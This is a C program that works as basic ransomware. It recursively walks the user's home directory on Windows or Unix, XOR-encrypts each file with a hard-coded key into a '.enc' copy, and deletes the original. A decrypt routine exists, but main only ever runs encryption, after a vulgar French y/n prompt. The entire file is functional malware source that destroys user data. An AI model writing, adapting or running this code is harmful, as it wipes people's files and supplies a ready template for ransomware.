#include <stdio.h>
#include <stdlib.h>
#ifdef _WIN32
    #include <windows.h>

#else
    #include <dirent.h>
#endif
#include <string.h>

void encrypt_file(char *filepath, unsigned char key)
{   
    unsigned char buffer[4096];
    char dest_path[4096];
    size_t nb_lus;


    snprintf(dest_path, sizeof(dest_path), "%s.enc", filepath);

    FILE *src = fopen(filepath, "rb");
    FILE *dest = fopen(dest_path, "wb");

    if (src == NULL || dest == NULL)
    {
        perror("error open");
        return;
    }

    while ((nb_lus = fread(buffer, 1, sizeof(buffer), src)) > 0)
    {
        for (int i = 0; i < nb_lus; i++)
        {
            buffer[i] = buffer[i] ^ key;
        }

        fwrite(buffer, 1, nb_lus, dest);
        
    }

    fclose(src);
    fclose(dest);

    remove(filepath);
}

void decrypt_file(char *filepath, unsigned char key) {
    unsigned char buffer[4096];
    char dest_path[4096];
    size_t nb_lus;

    strcpy(dest_path, filepath);
    dest_path[strlen(dest_path) - 4] = '\0'; 

    FILE *src = fopen(filepath, "rb");   
    FILE *dest = fopen(dest_path, "wb");  

    if (src == NULL || dest == NULL) {
        perror("error open decrypt");
        if (src) fclose(src);
        return;
    }

    while ((nb_lus = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        for (int i = 0; i < nb_lus; i++) {
            buffer[i] = buffer[i] ^ key;
        }
        fwrite(buffer, 1, nb_lus, dest);
    }

    fclose(src);
    fclose(dest);

    remove(filepath);
}

void scan_folder(char *path, unsigned char key, int mode)
{
    #ifdef _WIN32
        HANDLE hfind; 
        WIN32_FIND_DATAA findData;

        char mask[4096];
        snprintf(mask, sizeof(mask), "%s\\*", path);

        hfind = FindFirstFileA(mask, &findData);

        if (hfind == INVALID_HANDLE_VALUE)
        {
            return;
        }

        do
        {
            char fullpath[4096];
            snprintf(fullpath, sizeof(fullpath), "%s\\%s", path, findData.cFileName);

            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
            {
                scan_folder(fullpath, key, mode);
            }
             else 
            {
                if (mode == 0 && strstr(findData.cFileName, ".enc") == NULL){
                    encrypt_file(fullpath, key);
                }
                else if (mode == 1 && strstr(findData.cFileName, ".enc") != NULL){
                    decrypt_file(fullpath, key);
                }
            }
        } while (FindNextFileA(hfind, &findData));
        

        FindClose(hfind);
        
    #else
        DIR *doss = opendir(path);
        struct dirent *dir;
        char buffer[4096];

        if (doss == NULL)
        {
            perror("erreur dossier");
            return;
        }
    
        while ((dir = readdir(doss)) != NULL)
        {
            snprintf(buffer, sizeof(buffer), "%s/%s", path, dir->d_name);

            if (dir->d_type == DT_REG)
            {
                if (mode == 0 && strstr(dir->d_name, ".enc") == NULL) {
                    encrypt_file(buffer, key);
                }    
                else if (mode == 1 && strstr(dir->d_name, ".enc") != NULL) {
                    decrypt_file(buffer, key);
                }
        }
            else if (dir->d_type == DT_DIR)
            {
                if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
                scan_folder(buffer, key, mode);
            }
        }
        closedir(doss);
    #endif
    
}

int main(void)
{

    char *target_path;
    int key = 42;
    int mode = 0;

    #ifdef _WIN32
        target_path = getenv("USERPROFILE");
        
    #else
        target_path = getenv("HOME");

    #endif
        
    char choix;

    if (target_path == NULL)
    {
        printf("Dossier introuvable, ERROR");
        return 1;
    }

    printf("Voulez-vous vraiment enculer votre ordinateur %s ? (y/n)", target_path);
    scanf(" %c", &choix);

    if (choix == 'y' || choix == 'Y')
        scan_folder(target_path, key, mode);
    else if (choix == 'n' || choix == 'N')
        exit(EXIT_FAILURE);

    return 0;
}